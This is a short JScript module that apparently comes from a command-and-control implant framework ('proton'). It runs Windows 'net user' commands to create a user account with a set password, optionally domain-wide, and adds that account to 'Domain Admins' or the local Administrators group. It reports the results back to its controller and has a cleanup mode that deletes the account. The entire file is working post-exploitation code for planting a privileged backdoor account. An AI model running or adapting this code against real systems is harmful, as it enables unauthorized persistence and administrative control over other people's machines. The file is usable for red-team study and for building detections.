try
{

    var headers = {};

    if (~CLEANUP~)
    {
        var del_user_command = "net user ~USERNAME~ /DEL";
        var output = proton.shell.exec(del_user_command, "~DIRECTORY~\\"+proton.uuid()+".txt");
        headers["Task"] = "DeleteUser";
        proton.work.report(output, headers);
    }
    else
    {
        var add_user_command = "net user ~USERNAME~ ~PASSWORD~ /ADD";
        if (~DOMAIN~)
        {
            add_user_command += " /DOMAIN";
        }
        var output = proton.shell.exec(add_user_command, "~DIRECTORY~\\"+proton.uuid()+".txt");
        headers["Task"] = "CreateUser";
        proton.work.report(output, headers);
        if (output.indexOf("error") != -1)
        {
            throw "";
        }

        if (~ADMIN~)
        {
            if (~DOMAIN~)
            {
                output = proton.shell.exec("net group \"Domain Admins\" ~USERNAME~ /ADD /DOMAIN", "~DIRECTORY~\\"+proton.uuid()+".txt");
            }
            else
            {
                output = proton.shell.exec("net localgroup Administrators ~USERNAME~ /ADD", "~DIRECTORY~\\"+proton.uuid()+".txt");
            }
            headers["Task"] = "MakeAdmin";
            proton.work.report(output, headers);
        }
    }

    proton.work.report("Complete");

}
catch (e)
{
    proton.work.error(e);
}

proton.exit();
